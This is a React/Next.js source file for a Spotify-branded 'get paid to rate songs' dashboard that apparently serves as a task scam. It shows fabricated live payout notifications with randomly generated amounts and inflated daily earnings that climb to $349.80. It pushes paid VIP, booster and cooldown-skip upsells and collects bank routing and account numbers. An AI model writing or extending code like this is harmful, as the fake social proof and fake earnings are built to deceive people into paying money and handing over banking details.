'use client';

import { useState, useEffect, useRef } from 'react';
import Image from 'next/image';
import Link from 'next/link';
import { useRouter } from 'next/navigation';
import {
  ShieldCheck,
  Lock,
  Landmark,
  Play,
  Pause,
  CheckCircle2,
  AlertTriangle,
  Clock,
  Sparkles,
  TrendingUp,
  User,
  LogOut,
  Calendar,
  FileText,
  DollarSign,
  Music2,
  ChevronRight,
  ExternalLink,
  Volume2,
  ArrowRight,
  Info,
  Wallet,
  History,
  CreditCard,
  X,
  RefreshCw,
  AlertCircle,
  Eye,
  EyeOff,
  Ban,
} from 'lucide-react';
import { AMERICAN_LISTENERS_100, ListenerPayoutFeed } from '../../../lib/dashboardData';
import { supabase, updateListenerTermsInSupabase, recordListenerEvaluation, savePayoutCoordinates, recordFunnelEvent, unlockOfferBenefitAfterPayment, saveListenerAccount, checkAccountFraudBanStatus, OfferIdType } from '../../../lib/supabase';
import MetaPixelTracker from '../../components/MetaPixelTracker';

// Progressive 3-song daily earnings schedule from Day 1 ($98.23) jumping to $182.45 on Day 2 and scaling up to $349.80 on Day 7+
const DAILY_SONG_REWARDS_BY_DAY: Record<number, [number, number, number]> = {
  1: [32.48, 33.15, 32.60], // Day 1 Total = $98.23 USD
  2: [60.45, 61.20, 60.80], // Day 2 Total = $182.45 USD
  3: [72.60, 73.40, 72.90], // Day 3 Total = $218.90 USD
  4: [84.40, 85.15, 84.75], // Day 4 Total = $254.30 USD
  5: [96.25, 96.90, 96.60], // Day 5 Total = $289.75 USD
  6: [106.80, 107.45, 107.15], // Day 6 Total = $321.40 USD
  7: [116.20, 116.95, 116.65], // Day 7+ Total = $349.80 USD
};

function getProgressiveSongReward(day: number, songIndexToday: number): number {
  const clampedDay = Math.min(7, Math.max(1, day));
  const daySchedule = DAILY_SONG_REWARDS_BY_DAY[clampedDay] || DAILY_SONG_REWARDS_BY_DAY[7];
  if (songIndexToday < 3) {
    return daySchedule[songIndexToday];
  }
  // For Booster songs (#4, #5, #6 on the same day), pay the same day's average per-song rate with slight organic cents
  const baseRate = daySchedule[1];
  const jitter = ((songIndexToday * 17) % 35) / 100 - 0.15;
  return +(baseRate + jitter).toFixed(2);
}

function getDailyTotalEstimate(day: number, songLimit: number = 3): number {
  let total = 0;
  for (let i = 0; i < songLimit; i++) {
    total += getProgressiveSongReward(day, i);
  }
  return +total.toFixed(2);
}

export interface TrackItem {
  id: string;
  title: string;
  artist: string;
  cover: string;
  audio: string;
  q1: { question: string; options: string[] };
  q2: { question: string; options: string[] };
  q3: { question: string; options: string[] };
  q4: { question: string; options: string[] };
}

export const DAILY_TRACKS: TrackItem[] = [
  {
    id: 'track_1',
    title: 'Bloodstream',
    artist: 'Alyssa Grace',
    cover: '/covers/alyssa-grace-bloodstream.jpg',
    audio: '/audio/alyssa-grace-bloodstream.mp3',
    q1: {
      question: "1. How would you rate Alyssa Grace's vocal performance and acoustic production on 'Bloodstream'?",
      options: ['10/10 - Outstanding', '8/10 - Very Good', '6/10 - Average', '4/10 - Needs Improvement'],
    },
    q2: {
      question: "2. Which Spotify editorial playlist fits 'Bloodstream' best?",
      options: ['Acoustic Pop Chill', 'Indie Focus', 'Late Night Melancholy', 'Sad Girl Hours'],
    },
    q3: {
      question: '3. Would you add this track to your personal Liked Songs library?',
      options: ['Definitely Yes', 'Maybe', 'No'],
    },
    q4: {
      question: "4. What is your assessment of the song's commercial viral potential on TikTok/Reels?",
      options: ['High Viral Potential', 'Moderate Niche Appeal', 'Low Commercial Appeal'],
    },
  },
  {
    id: 'track_2',
    title: 'Sad Girls',
    artist: 'Bebe Rexha & David Guetta',
    cover: '/covers/bebe-rexha-sad-girls.jpg',
    audio: '/audio/bebe-rexha-sad-girls.mp3',
    q1: {
      question: "1. How do you rate the electronic dance beat and melody synthesis in 'Sad Girls'?",
      options: ['10/10 - Club Banger', '8/10 - Catchy Pop', '6/10 - Decent Beat', '4/10 - Too Repetitive'],
    },
    q2: {
      question: "2. Which Spotify editorial playlist is the ideal fit for 'Sad Girls'?",
      options: ['Dance Party 2026', 'Mint Electronic', 'Dance Pop Hits', 'EDM Workout'],
    },
    q3: {
      question: '3. Would you share this track on your social media stories?',
      options: ['Definitely Yes', 'Maybe', 'No'],
    },
    q4: {
      question: '4. How likely is this track to chart in the Billboard Hot 100 Top 20?',
      options: ['High Chart Potential', 'Moderate Charting', 'Low Charting Potential'],
    },
  },
  {
    id: 'track_3',
    title: 'After',
    artist: 'Conep',
    cover: '/covers/conep-after.jpg',
    audio: '/audio/conep-after.mp3',
    q1: {
      question: "1. How do you evaluate Conep's rap flow and instrumental bass response in 'After'?",
      options: ['10/10 - Heavy Fire', '8/10 - Strong Flow', '6/10 - Standard Trap', '4/10 - Needs Better Mixing'],
    },
    q2: {
      question: "2. Which Spotify editorial playlist fits 'After' best?",
      options: ['RapCaviar', 'Urban Heat', 'Trap Latino', 'Night Drive Beats'],
    },
    q3: {
      question: "3. Would you listen to 'After' during a gym workout session?",
      options: ['Definitely Yes', 'Maybe', 'No'],
    },
    q4: {
      question: '4. What is your overall rating of the track production quality?',
      options: ['Top Tier Production', 'Standard Studio Quality', 'Needs Master Adjustment'],
    },
  },
  {
    id: 'track_4',
    title: 'National Treasures',
    artist: 'Drake',
    cover: '/covers/drake-national-treasures.jpg',
    audio: '/audio/drake-national-treasures.mp3',
    q1: {
      question: "1. How do you rate Drake's lyricism and atmospheric beat selection on 'National Treasures'?",
      options: ['10/10 - Instant Classic', '8/10 - Great Flow', '6/10 - Good Album Cut', '4/10 - Average Drake Track'],
    },
    q2: {
      question: "2. Which Spotify playlist fits 'National Treasures' best?",
      options: ['Drake Official Complete', 'RapCaviar Gold', 'Hyped Urban', 'Late Night Vibe'],
    },
    q3: {
      question: '3. Would you add this track to your main favorite rap playlist?',
      options: ['Definitely Yes', 'Maybe', 'No'],
    },
    q4: {
      question: '4. How would you rate the commercial impact of this Drake track?',
      options: ['Global #1 Potential', 'High Streaming Hit', 'Moderate Niche Hit'],
    },
  },
  {
    id: 'track_5',
    title: "Choosin' Texas",
    artist: 'Ella Langley',
    cover: '/covers/ella-langley-choosin-texas.jpg',
    audio: '/audio/ella-langley-choosin-texas.mp3',
    q1: {
      question: "1. How do you rate Ella Langley's country vocal storytelling and guitar arrangement on 'Choosin' Texas'?",
      options: ['10/10 - Authentic Country Hit', '8/10 - Strong Storytelling', '6/10 - Solid Radio Track', '4/10 - Needs More Energy'],
    },
    q2: {
      question: "2. Which Spotify editorial playlist fits 'Choosin' Texas' best?",
      options: ['Hot Country', 'Country Coffeehouse', 'Texas Country Now', 'Road Trip Country'],
    },
    q3: {
      question: "3. Would you recommend 'Choosin' Texas' to fans of modern country music?",
      options: ['Definitely Yes', 'Maybe', 'No'],
    },
    q4: {
      question: '4. What is your projection for this track on Country Radio & Streaming Charts?',
      options: ['Top 10 Country Charter', 'Steady Regional Hit', 'Niche Acoustic Appeal'],
    },
  },
  {
    id: 'track_6',
    title: 'Tarantino',
    artist: 'LISA',
    cover: '/covers/lisa-tarantino.jpg',
    audio: '/audio/lisa-tarantino.mp3',
    q1: {
      question: "1. How do you evaluate LISA's vocal attitude, hook delivery, and cinematic production on 'Tarantino'?",
      options: ['10/10 - Global Pop Anthem', '8/10 - High Stylish Energy', '6/10 - Good Pop Track', '4/10 - Average Production'],
    },
    q2: {
      question: "2. Which Spotify editorial playlist is the strongest match for 'Tarantino'?",
      options: ["Today's Top Hits", 'Pop Rising', 'K-Pop ON! (온)', 'Main Character Energy'],
    },
    q3: {
      question: "3. Does 'Tarantino' have strong replay value for your daily rotation?",
      options: ['Definitely Yes', 'Maybe', 'No'],
    },
    q4: {
      question: '4. How do you rate the global viral choreography and TikTok trend potential of this release?',
      options: ['Massive Global Viral Hit', 'Strong Fanbase Appeal', 'Moderate Streaming Reach'],
    },
  },
  {
    id: 'track_7',
    title: 'DARK (CAR MIX)',
    artist: 'LRPM',
    cover: '/covers/lrpm-dark.jpg',
    audio: '/audio/lrpm-dark.mp3',
    q1: {
      question: "1. How do you rate the sub-bass depth, phonk/electronic drop, and car audio mastering on 'DARK (CAR MIX)'?",
      options: ['10/10 - Insane Bass & Drive Vibe', '8/10 - Clean Heavy Mix', '6/10 - Decent Electronic Beat', '4/10 - Too Distorted'],
    },
    q2: {
      question: "2. Which Spotify playlist category fits 'DARK (CAR MIX)' best?",
      options: ['Night Rider / Car Music', 'Phonk & Bass Boosted', 'Gym Hardstyle & EDM', 'Gaming Electronic'],
    },
    q3: {
      question: '3. Would you play this track while driving at night or working out?',
      options: ['Definitely Yes', 'Maybe', 'No'],
    },
    q4: {
      question: '4. What is your rating of the low-end frequency balance for car subwoofers and headphones?',
      options: ['Reference-Grade Bass', 'Good Club/Car Balance', 'Needs EQ Adjustment'],
    },
  },
  {
    id: 'track_8',
    title: 'SMACK THAT (CAR MIX)',
    artist: 'LRPM',
    cover: '/assets/aistudio/8_-LRPM_-_SMACK_THAT__CAR_MIX__-_LRPM_f083c249.jpg',
    audio: '/assets/aistudio/8_-LRPM_-_SMACK_THAT__CAR_MIX__-_LRPM_81c3eb8f.mp3',
    q1: {
      question: "1. How do you rate the modern car-bass remix and club energy of 'SMACK THAT (CAR MIX)'?",
      options: ['10/10 - Explosive Club & Car Mix', '8/10 - Great Nostalgic Drop', '6/10 - Standard Remix', '4/10 - Prefer Original'],
    },
    q2: {
      question: "2. Which Spotify playlist fits 'SMACK THAT (CAR MIX)' best?",
      options: ['Car Bass & Night Drive', '2000s Club Remixes', 'Workout Hype EDM', 'Party Bangers'],
    },
    q3: {
      question: '3. Would you add this high-energy remix to your workout or driving queue?',
      options: ['Definitely Yes', 'Maybe', 'No'],
    },
    q4: {
      question: '4. How do you rate the vocal clarity against the heavy electronic bassline?',
      options: ['Crystal Clear & Punchy', 'Balanced Club Mix', 'Bass Slightly Overpowers'],
    },
  },
  {
    id: 'track_9',
    title: 'the cure',
    artist: 'Olivia Rodrigo',
    cover: '/assets/aistudio/9__-Olivia_Rodrigo_-_the_cure__Official_Music_Video__02e3b4a3.jpg',
    audio: '/assets/aistudio/9__-Olivia_Rodrigo_-_the_cure__Official_Music_Video__ab8371d3.mp3',
    q1: {
      question: "1. How do you evaluate Olivia Rodrigo's emotional vocal buildup and acoustic-rock transition on 'the cure'?",
      options: ['10/10 - Masterpiece Emotion', '8/10 - Great Indie-Pop Build', '6/10 - Good Album Track', '4/10 - Slow Pacing'],
    },
    q2: {
      question: "2. Which Spotify editorial playlist fits 'the cure' best?",
      options: ["Today's Top Hits", 'Pop All Day', 'Indie Pop & Sad Beats', 'Teen Beats'],
    },
    q3: {
      question: "3. Would you save 'the cure' to your personal Favorites playlist?",
      options: ['Definitely Yes', 'Maybe', 'No'],
    },
    q4: {
      question: '4. What is your commercial forecast for this Olivia Rodrigo single on global streaming charts?',
      options: ['#1 Global Chart Smash', 'Top 10 Viral Hit', 'Strong Fanbase Favorite'],
    },
  },
  {
    id: 'track_10',
    title: 'The One That Got Away',
    artist: 'Katy Perry',
    cover: '/assets/aistudio/10_-_Katy_Perry_-_The_One_That_Got_Away__Director_s_Cut__-_KatyPerryVEVO_92da0066.jpg',
    audio: '/assets/aistudio/10_-_Katy_Perry_-_The_One_That_Got_Away__Director_s_Cut__-_KatyPerryVEVO_2e70218c.mp3',
    q1: {
      question: "1. How do you rate the timeless pop melody, piano intro, and emotional chorus on 'The One That Got Away'?",
      options: ['10/10 - Timeless Pop Classic', '8/10 - Strong Emotional Hook', '6/10 - Good Throwback', '4/10 - Outdated Style'],
    },
    q2: {
      question: "2. Which Spotify playlist category fits this Katy Perry track best?",
      options: ['All Out 2010s', 'Pop Classics & Throwbacks', 'Heartbreak Pop Anthems', 'Sing-Along Hits'],
    },
    q3: {
      question: '3. Does this track still hold high replay value for modern streaming listeners today?',
      options: ['Definitely Yes', 'Maybe', 'No'],
    },
    q4: {
      question: '4. How do you rate its evergreen viral resurgence potential on TikTok and Reels?',
      options: ['Massive Evergreen Viral', 'Steady Nostalgic Streams', 'Moderate Catalog Play'],
    },
  },
  {
    id: 'track_11',
    title: 'stupid song',
    artist: 'Olivia Rodrigo',
    cover: '/assets/aistudio/11_-_Olivia_Rodrigo_-_stupid_song__Official_Music_Video__-_OliviaRodrigoVEVO_80685e17.jpg',
    audio: '/assets/aistudio/11_-_Olivia_Rodrigo_-_stupid_song__Official_Music_Video__-_OliviaRodrigoVEVO_1306c400.mp3',
    q1: {
      question: "1. How do you rate the piano-to-rock dynamic explosion and raw vocal delivery on 'stupid song'?",
      options: ['10/10 - Phenomenal Pop-Rock Anthem', '8/10 - Great Dynamic Contrast', '6/10 - Decent Track', '4/10 - Too Chaotic'],
    },
    q2: {
      question: "2. Which Spotify editorial playlist matches 'stupid song' best?",
      options: ['Pop Rising', 'New Music Friday', 'Alt-Pop & Rock Anthems', 'Main Character Energy'],
    },
    q3: {
      question: "3. Would you share 'stupid song' with friends or add it to your daily rotation?",
      options: ['Definitely Yes', 'Maybe', 'No'],
    },
    q4: {
      question: '4. How do you rate the bridge and high-energy chorus for live concert and streaming appeal?',
      options: ['Arena-Ready Smash Hit', 'Strong Streaming Single', 'Niche Indie Appeal'],
    },
  },
  {
    id: 'track_12',
    title: 'Whisper My Name',
    artist: 'Drake',
    cover: '/assets/aistudio/12_-_Drake_-_Whisper_My_Name_-_DrakeVEVO_fc1759d0.jpg',
    audio: '/assets/aistudio/12_-_Drake_-_Whisper_My_Name_-_DrakeVEVO_cd912445.mp3',
    q1: {
      question: "1. How do you rate the sample intro, 808 bounce, and Drake's cadence on 'Whisper My Name'?",
      options: ['10/10 - Certified Rap Hit', '8/10 - Smooth Late-Night Flow', '6/10 - Solid Album Cut', '4/10 - Slow Intro'],
    },
    q2: {
      question: "2. Which Spotify editorial playlist fits 'Whisper My Name' best?",
      options: ['RapCaviar', 'Most Necessary', 'Late Night Hip-Hop', 'Signed XOXO'],
    },
    q3: {
      question: "3. Would you add 'Whisper My Name' to your personal hip-hop rotation?",
      options: ['Definitely Yes', 'Maybe', 'No'],
    },
    q4: {
      question: '4. What is your projection for first-week global Spotify streams on this release?',
      options: ['Top #1 Global Debut', 'Top 10 Rap Charting', 'Moderate Streaming Run'],
    },
  },
  {
    id: 'track_13',
    title: 'Hit the Wall',
    artist: 'Gracie Abrams',
    cover: '/assets/aistudio/13_-_Gracie_Abrams_-_Hit_the_Wall__Official_Music_Video__-_GracieAbramsVEVO_522b37c4.jpg',
    audio: '/assets/aistudio/13_-_Gracie_Abrams_-_Hit_the_Wall__Official_Music_Video__-_GracieAbramsVEVO_9e3f2d1f.mp3',
    q1: {
      question: "1. How do you rate Gracie Abrams' synth-pulse production and intimate vocal layering on 'Hit the Wall'?",
      options: ['10/10 - Captivating Indie-Pop', '8/10 - Emotional & Atmospheric', '6/10 - Pleasant Listen', '4/10 - Needs More Hook'],
    },
    q2: {
      question: "2. Which Spotify playlist is the ideal home for 'Hit the Wall'?",
      options: ['lori / Indie Pop', 'Sad Girl Starter Pack', 'Pop Rising', 'Chill Vibes'],
    },
    q3: {
      question: '3. Does the emotional bridge connect strongly enough to warrant repeat listens?',
      options: ['Definitely Yes', 'Maybe', 'No'],
    },
    q4: {
      question: '4. How do you rate the lyrical resonance for Gen-Z and pop streaming audiences?',
      options: ['High Viral & Fan Appeal', 'Solid Indie Following', 'Niche Listener Base'],
    },
  },
  {
    id: 'track_14',
    title: 'hate that i made you love me',
    artist: 'Ariana Grande',
    cover: '/assets/aistudio/14_-_Ariana_Grande_-_hate_that_i_made_you_love_me__official_music_video__-_ArianaGrandeVevo_edd53268.jpg',
    audio: '/assets/aistudio/14_-_Ariana_Grande_-_hate_that_i_made_you_love_me__official_music_video__-_ArianaGrandeVevo_68dcd3f3.mp3',
    q1: {
      question: "1. How do you evaluate Ariana Grande's vocal harmonies, synth-pop groove, and falsetto hook on this track?",
      options: ['10/10 - Vocal & Pop Perfection', '8/10 - Smooth R&B-Pop Vibe', '6/10 - Good Radio Track', '4/10 - Cinematic Intro Too Long'],
    },
    q2: {
      question: "2. Which Spotify editorial playlist fits 'hate that i made you love me' best?",
      options: ["Today's Top Hits", 'Hot Hits USA', 'R&B Pop Vibes', ' Ariana Grande Complete'],
    },
    q3: {
      question: '3. Would you save this Ariana Grande track to your main Pop Favorites playlist?',
      options: ['Definitely Yes', 'Maybe', 'No'],
    },
    q4: {
      question: '4. What is your forecast for this single on the Billboard Hot 100 & Spotify Global Top 50?',
      options: ['Guaranteed Top 5 Smash', 'Strong Top 20 Hit', 'Steady Fan Favorite'],
    },
  },
  {
    id: 'track_15',
    title: "Fallin'",
    artist: 'Chris Brown ft. Leon Thomas',
    cover: '/assets/aistudio/15_-_Chris_Brown_-_Fallin___Official_Video__ft._Leon_Thomas_-_ChrisBrownVEVO_dceab3d5.jpg',
    audio: '/assets/aistudio/15_-_Chris_Brown_-_Fallin___Official_Video__ft._Leon_Thomas_-_ChrisBrownVEVO_9d82c9b0.mp3',
    q1: {
      question: "1. How do you rate the soulful R&B instrumentation, live-band feel, and vocal runs on 'Fallin''?",
      options: ['10/10 - R&B Masterclass', '8/10 - Smooth Soulful Groove', '6/10 - Good Slow Jam', '4/10 - Intro Skit Too Long'],
    },
    q2: {
      question: "2. Which Spotify editorial playlist matches 'Fallin'' best?",
      options: ['Are & Be', 'R&B Right Now', 'Soulful Late Night', '90s/2000s R&B Feels'],
    },
    q3: {
      question: "3. Would you add 'Fallin'' to an evening chill or R&B playlist?",
      options: ['Definitely Yes', 'Maybe', 'No'],
    },
    q4: {
      question: '4. How do you rate the vocal chemistry between Chris Brown and Leon Thomas?',
      options: ['Grammy-Worthy Collaboration', 'Strong Vocal Pairing', 'Standard Feature'],
    },
  },
  {
    id: 'track_16',
    title: 'I Just Might',
    artist: 'Bruno Mars',
    cover: '/assets/aistudio/16_-_Bruno_Mars_-_I_Just_Might__Official_Music_Video__-_Bruno_Mars_ac32b066.jpg',
    audio: '/assets/aistudio/16_-_Bruno_Mars_-_I_Just_Might__Official_Music_Video__-_Bruno_Mars_ae7750c2.mp3',
    q1: {
      question: "1. How do you rate Bruno Mars' retro funk-pop groove, brass section, and infectious chorus on 'I Just Might'?",
      options: ['10/10 - Instant Funk-Pop Smash', '8/10 - Super Catchy & Upbeat', '6/10 - Fun Retro Track', '4/10 - Repetitive Hook'],
    },
    q2: {
      question: "2. Which Spotify editorial playlist fits 'I Just Might' best?",
      options: ["Today's Top Hits", 'Feel-Good Pop & Funk', 'Nu-Funk & Disco', 'Party Hits 2026'],
    },
    q3: {
      question: "3. Does 'I Just Might' make you want to replay it or play it at a social gathering?",
      options: ['Definitely Yes', 'Maybe', 'No'],
    },
    q4: {
      question: '4. What is your assessment of its global radio airplay and commercial appeal?',
      options: [' Worldwide #1 Radio Anthem', 'High-Rotation Pop Hit', 'Moderate Dance Hit'],
    },
  },
  {
    id: 'track_17',
    title: 'Manchild',
    artist: 'Sabrina Carpenter',
    cover: '/assets/aistudio/17_-_Sabrina_Carpenter_-_Manchild__Official_Video__-_SabrinaCarpenterVEVO_e57521b0.jpg',
    audio: '/assets/aistudio/17_-_Sabrina_Carpenter_-_Manchild__Official_Video__-_SabrinaCarpenterVEVO_b9fb606c.mp3',
    q1: {
      question: "1. How do you rate Sabrina Carpenter's witty lyricism, country-pop bounce, and vocal hook on 'Manchild'?",
      options: ['10/10 - Viral Pop Smash', '8/10 - Clever & Catchy', '6/10 - Fun Album Cut', '4/10 - Needs More Energy'],
    },
    q2: {
      question: "2. Which Spotify editorial playlist fits 'Manchild' best?",
      options: ["Today's Top Hits", 'Hot Hits USA', 'Pop Sauce', 'Girls Night Out'],
    },
    q3: {
      question: "3. Would you save 'Manchild' to your personal upbeat Pop playlist?",
      options: ['Definitely Yes', 'Maybe', 'No'],
    },
    q4: {
      question: '4. How do you rate its TikTok/Reels lip-sync and viral trend potential?',
      options: ['Massive Viral Sound', 'Strong Fan Trend', 'Moderate Social Reach'],
    },
  },
  {
    id: 'track_18',
    title: 'BOO',
    artist: 'H3ADBAND',
    cover: '/assets/aistudio/18_-_H3ADBAND_-_BOO__Official_Music_Video___-_H3adband_50d7d02d.jpg',
    audio: '/assets/aistudio/18_-_H3ADBAND_-_BOO__Official_Music_Video___-_H3adband_81615412.mp3',
    q1: {
      question: "1. How do you rate the West Coast synth lead, heavy 808 bounce, and rap cadence on 'BOO'?",
      options: ['10/10 - Certified Street Banger', '8/10 - Hard Bounce & Flow', '6/10 - Decent Trap Beat', '4/10 - Repetitive Hook'],
    },
    q2: {
      question: "2. Which Spotify hip-hop playlist fits 'BOO' best?",
      options: ['RapCaviar', 'West Coast Classics / Now', 'Get Turnt', 'Gym Rap Hype'],
    },
    q3: {
      question: "3. Would you play 'BOO' in your car audio system or workout mix?",
      options: ['Definitely Yes', 'Maybe', 'No'],
    },
    q4: {
      question: '4. How do you rate the production punch and club/party energy of this track?',
      options: ['High-Energy Club Anthem', 'Solid Street Single', 'Niche Regional Hit'],
    },
  },
  {
    id: 'track_19',
    title: 'Beat Yourself Up',
    artist: 'Charlie Puth',
    cover: '/assets/aistudio/19_-_Charlie_Puth_-_Beat_Yourself_Up__Performance_Video__-_Charlie_Puth_b37259ff.jpg',
    audio: '/assets/aistudio/19_-_Charlie_Puth_-_Beat_Yourself_Up__Performance_Video__-_Charlie_Puth_f3194187.mp3',
    q1: {
      question: "1. How do you evaluate Charlie Puth's live Rhodes piano arrangement, brass solo, and uplifting vocals on 'Beat Yourself Up'?",
      options: ['10/10 - Brilliant Live-Pop Production', '8/10 - Warm & Uplifting Groove', '6/10 - Good Radio Pop', '4/10 - Too Retro'],
    },
    q2: {
      question: "2. Which Spotify editorial playlist is the best match for 'Beat Yourself Up'?",
      options: ['Soft Pop Hits', 'Feel-Good Indie & Pop', 'Morning Commute Boost', 'Pop Rising'],
    },
    q3: {
      question: '3. Does the encouraging lyrical message make this a track you would share with a friend?',
      options: ['Definitely Yes', 'Maybe', 'No'],
    },
    q4: {
      question: '4. What is your assessment of the live instrumentation and studio mix quality?',
      options: ['Audiophile Studio Masterpiece', 'Clean Radio Mix', 'Standard Pop Production'],
    },
  },
  {
    id: 'track_20',
    title: 'Sapphire',
    artist: 'Ed Sheeran',
    cover: '/assets/aistudio/20_-_Ed_Sheeran_-_Sapphire__Official_Music_Video__-_Ed_Sheeran_3002d410.jpg',
    audio: '/assets/aistudio/20_-_Ed_Sheeran_-_Sapphire__Official_Music_Video__-_Ed_Sheeran_26dc2df6.mp3',
    q1: {
      question: "1. How do you rate Ed Sheeran's cross-cultural fusion, rhythmic beat drop, and melodic chorus on 'Sapphire'?",
      options: ['10/10 - Global Fusion Masterpiece', '8/10 - Infectious Summer Beat', '6/10 - Interesting Experiment', '4/10 - Prefer Acoustic Ed'],
    },
    q2: {
      question: "2. Which Spotify playlist fits 'Sapphire' best?",
      options: ["Today's Top Hits", 'Global Hitmakers', 'Summer Party 2026', 'Pop & World Fusion'],
    },
    q3: {
      question: "3. Would you add 'Sapphire' to your summer or travel playlist?",
      options: ['Definitely Yes', 'Maybe', 'No'],
    },
    q4: {
      question: '4. What is your projection for international streaming reach across US, UK, and South Asian charts?',
      options: ['Massive Global #1 Crossover', 'High International Charting', 'Moderate Streaming Appeal'],
    },
  },
];

export default function SpotifyDashboardPage() {
  const router = useRouter();

  // User state
  const [isAuthChecking, setIsAuthChecking] = useState(true);
  const [isAccountBanned, setIsAccountBanned] = useState(false);
  const [listenerName, setListenerName] = useState('Verified Listener');
  const [listenerEmail, setListenerEmail] = useState('');
  const [payoutMethodInfo, setPayoutMethodInfo] = useState<{ method: string; target: string }>({
    method: 'Direct Deposit / ACH',
    target: 'Payout Destination Active',
  });
  const [accountBalance, setAccountBalance] = useState<number>(114.93);
  const [todayEarned, setTodayEarned] = useState<number>(0);
  const [releaseDateFormatted, setReleaseDateFormatted] = useState<string>('');

  // Active track derived selector
  const [activeSongIndex, setActiveSongIndex] = useState<number>(0);
  const currentTrack = DAILY_TRACKS[activeSongIndex % DAILY_TRACKS.length];

  // Cadence & VIP Membership State (15-Day Standard vs 7-Day VIP)
  const [isVip7Day, setIsVip7Day] = useState<boolean>(false);
  const [showCadenceUpsellModal, setShowCadenceUpsellModal] = useState<boolean>(false);
  const [cadenceUpsellDeclined, setCadenceUpsellDeclined] = useState<boolean>(false);
  const [showCadenceDownsellModal, setShowCadenceDownsellModal] = useState<boolean>(false);

  // Daily Tasks, Progressive Day Counter, Task Boosters & 12h Cooldown Timer State
  const [currentDay, setCurrentDay] = useState<number>(1);
  const [songsCompletedToday, setSongsCompletedToday] = useState<number>(0);
  const [dailySongLimit, setDailySongLimit] = useState<number>(3);
  const [showTaskBoosterUpsellModal, setShowTaskBoosterUpsellModal] = useState<boolean>(false);
  const [showTaskBoosterDownsellModal, setShowTaskBoosterDownsellModal] = useState<boolean>(false);
  const [cooldownSecondsLeft, setCooldownSecondsLeft] = useState<number>(43200); // 12 hours in seconds
  const [showSkipCooldownModal, setShowSkipCooldownModal] = useState<boolean>(false);

  // Profile & Payout Modal State
  const [showProfileModal, setShowProfileModal] = useState(false);
  const [activeProfileTab, setActiveProfileTab] = useState<'profile' | 'payout_method' | 'request_withdrawal' | 'history'>('profile');
  const [withdrawalFilter, setWithdrawalFilter] = useState<'all' | 'pending' | 'completed' | 'declined'>('all');
  const [accountTier, setAccountTier] = useState<'Standard Verified Tier' | 'VIP Gold Tier'>('Standard Verified Tier');
  const [withdrawalRequestedMessage, setWithdrawalRequestedMessage] = useState<string | null>(null);
  const [upgradedBannerMessage, setUpgradedBannerMessage] = useState<string | null>(null);

  // Edit Payout Details Form inside Modal
  const [editMethod, setEditMethod] = useState<'direct_deposit' | 'zelle' | 'cashapp' | 'paypal' | 'apple_cash'>('direct_deposit');
  const [editBankName, setEditBankName] = useState('');
  const [editRoutingNumber, setEditRoutingNumber] = useState('');
  const [editAccountNumber, setEditAccountNumber] = useState('');
  const [editZelleTag, setEditZelleTag] = useState('');
  const [editCashappTag, setEditCashappTag] = useState('');
  const [editPaypalEmail, setEditPaypalEmail] = useState('');
  const [editAppleCashPhone, setEditAppleCashPhone] = useState('');
  const [isUpdatingPayout, setIsUpdatingPayout] = useState(false);
  const [updateSuccess, setUpdateSuccess] = useState(false);

  // First Login Terms & Guidelines Modal + Post-Guidelines Password Setup Modal
  const [showAgreementModal, setShowAgreementModal] = useState(false);
  const [hasScrolledTerms, setHasScrolledTerms] = useState(false);
  const [agreementChecked, setAgreementChecked] = useState(false);
  const termsScrollRef = useRef<HTMLDivElement>(null);

  const [showCreatePasswordModal, setShowCreatePasswordModal] = useState(false);
  const [newAccountPassword, setNewAccountPassword] = useState('');
  const [showPasswordText, setShowPasswordText] = useState(false);
  const [isSavingPassword, setIsSavingPassword] = useState(false);
  const [passwordError, setPasswordError] = useState<string | null>(null);

  // Floating Live Listener Toast Notification State (Shuffled & Organic $12-$25)
  const [activeToastListener, setActiveToastListener] = useState<ListenerPayoutFeed | null>(null);
  const [isToastVisible, setIsToastVisible] = useState(false);
  const toastIndexRef = useRef(0);
  const shuffledListenersRef = useRef<ListenerPayoutFeed[]>([]);

  // Cycle Live US Listener Commission Notifications with Organic Random Timing & Shuffled Order
  useEffect(() => {
    // Fisher-Yates shuffle on every mount/refresh so order is never repetitive
    const copy = [...AMERICAN_LISTENERS_100];
    for (let i = copy.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [copy[i], copy[j]] = [copy[j], copy[i]];
    }
    shuffledListenersRef.current = copy;
    toastIndexRef.current = 0;

    let hideTimeout: NodeJS.Timeout;
    let nextToastTimeout: NodeJS.Timeout;
    let isCancelled = false;

    const scheduleNextOrganicToast = (isFirst = false) => {
      if (isCancelled) return;
      // First notification appears randomly between 9s and 17s; subsequent ones between 18s and 42s
      const randomDelayMs = isFirst
        ? Math.floor(9000 + Math.random() * 8000)
        : Math.floor(18000 + Math.random() * 24000);

      nextToastTimeout = setTimeout(() => {
        if (isCancelled) return;
        const pool =
          shuffledListenersRef.current.length > 0
            ? shuffledListenersRef.current
            : AMERICAN_LISTENERS_100;
        const idx = toastIndexRef.current % pool.length;
        toastIndexRef.current += 1;

        const baseListener = pool[idx];
        // Generate organic single-track commission between $12.00 and $25.00
        const organicAmount = +(12.0 + Math.random() * 13.0).toFixed(2);

        setActiveToastListener({
          ...baseListener,
          amount: organicAmount,
        });
        setIsToastVisible(true);

        hideTimeout = setTimeout(() => {
          if (!isCancelled) {
            setIsToastVisible(false);
          }
        }, 4800);

        scheduleNextOrganicToast(false);
      }, randomDelayMs);
    };

    scheduleNextOrganicToast(true);

    return () => {
      isCancelled = true;
      clearTimeout(nextToastTimeout);
      clearTimeout(hideTimeout);
    };
  }, []);

  // Music Evaluation Player & Routine State
  const [isEvaluating, setIsEvaluating] = useState(false);
  const [isPlayingAudio, setIsPlayingAudio] = useState(false);
  const [audioCurrentTime, setAudioCurrentTime] = useState(0);
  const [audioDuration, setAudioDuration] = useState(0);
  const [audioProgress, setAudioProgress] = useState(0);
  const [previewUnlocked, setPreviewUnlocked] = useState(false);
  const [question1Answer, setQuestion1Answer] = useState<string | null>(null);
  const [question2Answer, setQuestion2Answer] = useState<string | null>(null);
  const [question3Answer, setQuestion3Answer] = useState<string | null>(null);
  const [question4Answer, setQuestion4Answer] = useState<string | null>(null);
  const [evaluationCompleted, setEvaluationCompleted] = useState(false);
  const [evaluationReward, setEvaluationReward] = useState<number>(32.48); // Dynamic progressive per day/song
  const audioRef = useRef<HTMLAudioElement | null>(null);
  const maxPlayedTimeRef = useRef<number>(0);

  // Tamper-Proof 12-Hour Cooldown Timer Ticker Effect (Synced with Real Timestamp in localStorage)
  useEffect(() => {
    if (typeof window === 'undefined' || !listenerEmail) return;
